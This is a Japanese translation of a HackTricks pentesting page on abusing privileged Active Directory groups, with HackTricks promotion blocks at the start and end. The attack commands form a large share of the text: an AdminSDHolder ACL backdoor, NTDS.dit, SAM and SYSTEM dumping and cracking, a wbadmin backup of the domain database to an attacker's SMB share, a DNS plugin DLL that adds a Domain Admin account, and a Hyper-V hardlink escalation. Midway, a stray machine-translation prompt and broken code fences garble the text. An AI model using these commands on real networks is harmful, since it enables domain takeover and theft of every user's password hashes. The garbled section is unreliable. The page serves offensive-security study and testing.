# 特権グループ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**

</details>

## 管理権限を持つ既知のグループ

* **管理者**
* **ドメイン管理者**
* **エンタープライズ管理者**

セキュリティ評価中に複数の攻撃ベクトルを連鎖させる際にも役立つ、他のアカウントメンバーシップやアクセストークン権限があります。

## アカウントオペレータ <a href="#account-operators" id="account-operators"></a>

* ドメイン上で非管理者アカウントとグループを作成することを許可
* DCにローカルでログインすることを許可

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
spotlessのユーザーメンバーシップに注目してください：

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

しかし、新しいユーザーを追加することはまだ可能です：

![](../../.gitbook/assets/a2.png)

また、DC01にローカルでログインすることもできます：

![](../../.gitbook/assets/a3.png)

## AdminSDHolder グループ

**AdminSDHolder** オブジェクトのアクセスコントロールリスト（ACL）は、Active Directory内の**すべての「保護されたグループ」**とそのメンバーに**権限**を**コピー**するためのテンプレートとして使用されます。保護されたグループには、Domain Admins、Administrators、Enterprise Admins、Schema Adminsなどの特権グループが含まれます。\
デフォルトでは、このグループのACLはすべての「保護されたグループ」内にコピーされます。これは、これらの重要なグループへの意図的または偶発的な変更を防ぐために行われます。しかし、攻撃者が例えば一般ユーザーに完全な権限を与えることで**AdminSDHolder** グループのACLを変更した場合、このユーザーは保護されたグループ内のすべてのグループに対して完全な権限を持つことになります（1時間以内に）。\
そして、誰かが（例えば）Domain Adminsからこのユーザーを削除しようとした場合、1時間以内に、そのユーザーはグループに戻されます。

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
**AdminSDHolder** グループにユーザーを追加する：
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
ユーザーが **Domain Admins** グループ内にいるかどうかを確認します：
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
待ち時間を1時間待ちたくない場合は、PSスクリプトを使用して即時に復元を行うことができます：[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**ired.teamでの詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD リサイクルビン**

このグループは、削除されたADオブジェクトを読む権限を与えます。そこには価値のある情報が見つかるかもしれません：
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ドメインコントローラへのアクセス

現在のメンバーシップではDC上のファイルにアクセスできないことに注意してください：

![](../../.gitbook/assets/a4.png)

しかし、ユーザーが`Server Operators`に属している場合：

![](../../.gitbook/assets/a5.png)

話は変わります：

![](../../.gitbook/assets/a6.png)

### 権限昇格 <a href="#backup-operators" id="backup-operators"></a>

サービスの権限をチェックするには、Sysinternalsの[`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)または`sc`を使用します。
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
このことから、Server Operators グループには [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) アクセス権があり、このサービスを完全に制御できることが確認できます。
このサービスを悪用して[**任意のコマンドを実行させるサービスを作成**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path)し、権限を昇格させることができます。

## バックアップオペレーター <a href="#backup-operators" id="backup-operators"></a>

`Server Operators` のメンバーシップと同様に、`Backup Operators` に属している場合、`DC01` のファイルシステムに**アクセスできます**。

これは、このグループがメンバーに [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) と [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) の特権を付与するためです。**SeBackupPrivilege** により、任意のフォルダを**横断し、フォルダの内容をリスト**することができます。これにより、他に許可がなくても**フォルダからファイルをコピー**することができます。ただし、この権限を悪用してファイルをコピーするには、フラグ [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* を使用する必要があります。したがって、特別なツールが必要です。

この目的のために、[**これらのスクリプト**](https://github.com/giuliano108/SeBackupPrivilege)**を使用できます。**

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **ローカルアタック**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD攻撃

例えば、ドメインコントローラのファイルシステムに直接アクセスすることができます：

![](../../.gitbook/assets/a7.png)

このアクセスを悪用して、アクティブディレクトリデータベース **`NTDS.dit`** を**盗む**ことで、ドメイン内のすべてのユーザーとコンピュータオブジェクトの**NTLMハッシュ**を取得できます。

#### diskshadow.exeを使用してNTDS.ditをダンプする

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)を使用すると、例えば**`C`ドライブ**の**シャドウコピー**を作成し、`F`ドライブに配置することができます。その後、このシャドウコピーからシステムによって使用されていない`NTDS.dit`ファイルを盗むことができます：
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
ローカル攻撃と同様に、特権ファイル **`NTDS.dit`** をコピーすることができます：
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
ファイルをコピーする別の方法は、[**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:** を使用することです。
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
その後、簡単に**SYSTEM**と**SAM**を**盗む**ことができます：
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
最終的に、**`NTDS.dit`** から**すべてのハッシュを取得**できます：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exeを使用してNTDS.ditをダンプする

wbadmin.exeの使用はdiskshadow.exeと非常に似ています。wbadmin.exeユーティリティは、Windows Vista/Server 2008以降のWindowsに組み込まれているコマンドラインユーティリティです。

使用する前に、攻撃者マシンで[**SMBサーバーのためのNTFSファイルシステムを設定する**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801)必要があります。

SMBサーバーの設定が完了したら、ターゲットマシンでSMBクレデンシャルをキャッシュする必要があります：
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
エラーがなければ、それを悪用するために wbadmin.exe を使用します：
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
以下は、ハッキング技術に関する本の内容です。関連する英語テキストを日本語に翻訳し、同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

```
成功すると、`C:\ntds.dit`にダンプされます。

[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

**DNSAdmins** グループのメンバーであるユーザー、または **DNS** サーバーオブジェクトに **書き込み権限** を持っているユーザーは、**DNSサーバー**上で **SYSTEM** 権限を持つ **任意のDLL** をロードすることができます。
これは、**ドメインコントローラー**が **DNSサーバー** として頻繁に **使用される** ため、非常に興味深いです。

この \*\*\*\* [**ポスト**](https://adsecurity.org/?p=4064) に示されているように、DNSがドメインコントローラーで実行されている場合（非常に一般的です）には、次の攻撃を実行できます：

* DNS管理はRPCを介して行われます
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) は、DLLのパスの検証なしにカスタム **DLL** を **ロード** することを可能にします。これはコマンドラインから `dnscmd` ツールを使用して行うことができます
* **`DnsAdmins`** グループのメンバーが以下の **`dnscmd`** コマンドを実行すると、`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` レジストリキーが設定されます
* **DNSサービスが再起動されると**、このパスの **DLL** が **ロードされます**（例えば、ドメインコントローラーのマシンアカウントがアクセスできるネットワーク共有）
* 攻撃者は、リバースシェルを取得するための **カスタムDLL** をロードしたり、MimikatzのようなツールをDLLとしてロードして認証情報をダンプすることができます。

グループの **メンバー** を取得する：
```
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意のDLLを実行する

**DNSAdmins グループ**内のユーザーがいる場合、**DNSサーバーに SYSTEM 権限で任意のDLLをロードさせる**ことができます（DNSサービスは `NT AUTHORITY\SYSTEM` として実行されます）。以下のコマンドを実行することで、DNSサーバーに**ローカルまたはリモート**（SMBによって共有される）DLLファイルをロードさせることができます：
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
```markdown
有効なDLLの例は[https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL)で見つけることができます。私なら`DnsPluginInitialize`関数のコードを次のように変更します：
```
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
または、msfvenomを使用してdllを生成することもできます：
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
したがって、**DNSservice** が開始または再起動されると、新しいユーザーが作成されます。

DNSAdmin グループ内にユーザーがいても、**デフォルトでは DNS サービスを停止および再起動することはできません。** しかし、常に試みることができます:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
#### Mimilib.dll

この[**投稿**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)で詳しく説明されているように、`Mimikatz`ツールの作成者が提供する[**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)を使用して、[**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)ファイルを**変更**し、**リバースシェル**のワンライナーや選択した他のコマンドを実行することでコマンド実行を得ることが可能です。

### WPADレコードによるMitM

**DnsAdmins**グループの権限を**悪用**する別の方法は、**WPADレコード**を作成することです。このグループのメンバーであれば、[グローバルクエリブロックセキュリティを無効にする](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)権限があり、これによりデフォルトではこの攻撃をブロックします。サーバー2008は、DNSサーバー上でグローバルクエリブロックリストに追加する機能を初めて導入しました。デフォルトでは、Web Proxy Automatic Discovery Protocol (WPAD) と Intra-site Automatic Tunnel Addressing Protocol (ISATAP) がグローバルクエリブロックリストに含まれています。これらのプロトコルはハイジャックに非常に脆弱で、どのドメインユーザーでもこれらの名前を含むコンピューターオブジェクトやDNSレコードを作成することができます。

**グローバルクエリ**ブロックリストを無効にし、**WPADレコード**を作成した後、デフォルト設定でWPADを実行している**すべてのマシン**のトラフィックは、**攻撃マシンを通じてプロキシされます**。[**Responder**](https://github.com/lgandx/Responder)や[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)などのツールを使用してトラフィックのスプーフィングを行い、パスワードハッシュをキャプチャしてオフラインでクラックするか、SMBRelay攻撃を試みることができます。

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## イベントログリーダー

[**イベントログリーダー**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN)グループのメンバーは、生成されたイベントログ（新しいプロセス作成ログなど）に**アクセスする権限**を持っています。ログには**機密情報**が含まれている可能性があります。ログの可視化方法について見ていきましょう：
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows 権限

メンバーは**ドメインオブジェクトにDACLを書き込む**能力が与えられます。攻撃者はこれを悪用して、ユーザーに[**DCSync**](dcsync.md)権限を**与える**ことができます。\
AD環境にMicrosoft Exchangeがインストールされている場合、このグループのメンバーとしてユーザーアカウントやコンピューターが見つかることが一般的です。

この [**GitHub リポジトリ**](https://github.com/gdedrouas/Exchange-AD-Privesc) は、このグループの権限を悪用して**権限を昇格させる**いくつかの**テクニック**を説明しています。
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V 管理者

[**Hyper-V 管理者**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) グループは、すべての [Hyper-V 機能](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) に対する完全なアクセス権を持っています。**ドメインコントローラー**が **仮想化**されている場合、**仮想化管理者**は **ドメイン管理者**と見なすべきです。彼らは簡単に**ライブドメインコントローラーのクローンを作成**し、仮想**ディスク**をオフラインで**マウント**して **`NTDS.dit`** ファイルを取得し、ドメイン内のすべてのユーザーの NTLM パスワードハッシュを抽出することができます。

また、この[ブログ](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)によく文書化されているように、仮想マシンを**削除**すると、`vmms.exe` は対応する **`.vhdx` ファイル**の元のファイル権限を**復元**しようとします。これは `NT AUTHORITY\SYSTEM` として行われ、ユーザーを偽装せずに行われます。私たちは **`.vhdx`** ファイルを**削除**し、このファイルを**保護された SYSTEM ファイル**にリンクするネイティブな**ハードリンク**を**作成**することができ、完全な権限が与えられます。

オペレーティングシステムが [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) または [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) に対して脆弱である場合、これを利用して SYSTEM 権限を取得することができます。そうでない場合は、サーバーにインストールされているアプリケーションを利用しようと試みることができます。このアプリケーションは SYSTEM のコンテキストで実行されるサービスを持ち、特権のないユーザーによって起動可能です。

### **悪用例**

これの一例は **Firefox** で、**`Mozilla Maintenance Service`** をインストールします。以下のファイルに対して現在のユーザーに完全な権限を付与するために、[このエクスプロイト](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)（NT ハードリンクの概念実証）を更新することができます：
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **ファイルの所有権を取得する**

PowerShellスクリプトを実行した後、**このファイルを完全に制御し、所有権を取得できるはずです**。
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Mozilla Maintenance Service の開始**

次に、このファイルを**悪意のある `maintenanceservice.exe`** に置き換え、メンテナンス**サービス**を**開始**し、SYSTEM としてコマンド実行を取得できます。
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
このベクターは、2020年3月のWindowsセキュリティアップデートによって緩和されました。これはハードリンクに関連する動作を変更しました。
{% endhint %}

## 組織管理

このグループは、**Microsoft Exchange**がインストールされている環境にも存在します。\
このグループのメンバーは、**すべての**ドメインユーザーの**メールボックス**に**アクセス**できます。\
また、このグループは`Microsoft Exchange Security Groups`というOUの**完全な制御**を持っており、その中にはグループ[**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions)が含まれています（このグループを悪用して権限昇格する方法についてはリンクを参照してください）。

## 印刷オペレーター

このグループのメンバーには以下が付与されます：

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **ドメインコントローラーにローカルでログオン**してシャットダウンする
* ドメインコントローラーに接続された**プリンター**の管理、作成、共有、削除の権限

{% hint style="warning" %}
コマンド`whoami /priv`が昇格していないコンテキストから**`SeLoadDriverPrivilege`**を表示しない場合、UACをバイパスする必要があります。
{% endhint %}

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
このページでSeLoadDriverPrivilegeを悪用して権限昇格する方法を確認してください：

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## リモートデスクトップユーザー

このグループのメンバーはRDPを通じてPCにアクセスできます。\
グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
**RDP** についての詳細情報:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## リモート管理ユーザー

このグループのメンバーは、**WinRM** を介してPCにアクセスできます。
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**についての詳細情報:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## サーバーオペレーター <a href="#server-operators" id="server-operators"></a>

このメンバーシップは、以下の権限を持ってドメインコントローラーを設定することをユーザーに許可します:

* ローカルにログオンする
* ファイルとディレクトリのバックアップ
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) と [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* システム時刻の変更
* タイムゾーンの変更
* リモートシステムからの強制シャットダウン
* ファイルとディレクトリの復元
* システムのシャットダウン
* ローカルサービスの制御

グループの**メンバー**を取得する:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考文献 <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
